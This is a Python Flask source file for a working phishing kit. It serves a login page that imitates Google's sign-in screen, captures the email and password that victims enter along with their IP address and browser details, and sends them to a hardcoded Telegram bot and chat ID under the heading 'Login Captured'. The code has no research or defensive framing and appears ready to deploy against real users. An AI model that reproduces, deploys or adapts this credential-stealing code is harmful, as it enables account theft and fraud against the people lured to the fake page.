from flask import Flask, request, render_template_string
import requests
from datetime import datetime

# Replace with your bot token and chat ID
BOT_TOKEN = "7901711799:AAEWnySjRO5KgEMpUQmz7fwnYzlumt_AlX4"
CHAT_ID = "6908281054"

app = Flask(__name__)

# Google-style HTML login page
login_page = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in - Google Accounts</title>
  <link rel="icon" href="https://ssl.gstatic.com/accounts/static/_/img/favicon.ico">
  <style>
    body { margin: 0; font-family: Roboto, Arial, sans-serif; background-color: #f2f2f2; }
    .container {
      width: 100%; max-width: 400px; margin: 80px auto; background: white;
      padding: 40px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); border-radius: 8px;
    }
    .logo { display: block; margin: 0 auto 20px; width: 75px; }
    h2 { font-size: 24px; font-weight: 400; margin: 0 0 20px; }
    input[type=email], input[type=password] {
      width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc;
      border-radius: 4px; box-sizing: border-box;
    }
    button {
      width: 100%; padding: 12px; background-color: #1a73e8;
      color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer;
    }
    button:hover { background-color: #1669c1; }
    .footer { font-size: 12px; color: #777; text-align: center; margin-top: 20px; }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" class="logo" alt="Google">
    <h2>Sign in</h2>
    <form method="POST" action="/token">
      <input type="email" name="email" placeholder="Email or phone" required>
      <input type="password" name="password" placeholder="Enter your password" required>
      <button type="submit">Next</button>
    </form>
    <div class="footer">Not your computer? Use Guest mode to sign in privately.</div>
  </div>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(login_page)

@app.route('/token', methods=['POST'])
def token():
    email = request.form.get('email')
    password = request.form.get('password')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent')

    message = f"""
🛡️ Login Captured
📧 Email: {email}
🔑 Password: {password}
🌐 IP: {ip}
📱 Device: {ua}
📅 Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC
🔗 Page: https://govt-of-pakinstn.onrender.com
    """

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    try:
        requests.post(url, data=data)
    except Exception as e:
        print("Failed to send message to Telegram:", e)

    return f"<h2>Welcome, {email}</h2><p>Redirecting...</p><script>setTimeout(()=>window.location='/', 2000);</script>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
